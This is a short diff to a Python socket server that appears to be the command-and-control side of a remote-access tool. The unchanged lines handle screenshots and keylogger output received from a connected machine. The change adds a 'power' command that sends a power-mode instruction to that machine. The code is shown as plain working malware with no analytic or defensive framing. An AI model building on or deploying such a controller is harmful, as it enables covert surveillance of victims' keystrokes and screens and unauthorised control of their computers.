@@ -79,6 +79,11 @@ def receive_key_logger(conn):
             break
         print(decoded_data, end='', flush=True)
 
+
+
+
+
+
 # --- PHẦN LUỒNG CHÍNH CỦA SERVER ---
 server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 server.bind(('0.0.0.0', 8080))
@@ -102,6 +107,9 @@ while cmd != 'exit':
         receive_screenshot(conn)
     elif cmd == 'keylogger':
         receive_key_logger(conn)
+    elif cmd == 'power':
+        cmd = input('what power mdoe: ')
+        conn.sendall(bytes(cmd, 'utf-8'))
     cmd = input('enter command: ')
 
 conn.close()
